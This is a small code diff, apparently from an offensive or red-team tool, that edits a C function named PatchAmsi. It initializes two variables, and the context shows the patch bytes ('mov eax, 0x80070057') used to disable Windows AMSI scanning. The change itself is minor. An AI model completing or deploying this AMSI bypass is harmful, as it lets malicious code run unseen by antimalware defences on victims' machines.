@@ -10,8 +10,8 @@ BOOL PatchAmsi
 
 {
 
-	DWORD dwOldProt;
-	PBYTE AmsiFunc;
+	DWORD dwOldProt = 0;
+	PBYTE AmsiFunc  = NULL;
 
 	BYTE patch[] = {
 		0xB8, 0x57, 0x00, 0x07, 0x80 // mov eax, 0x80070057
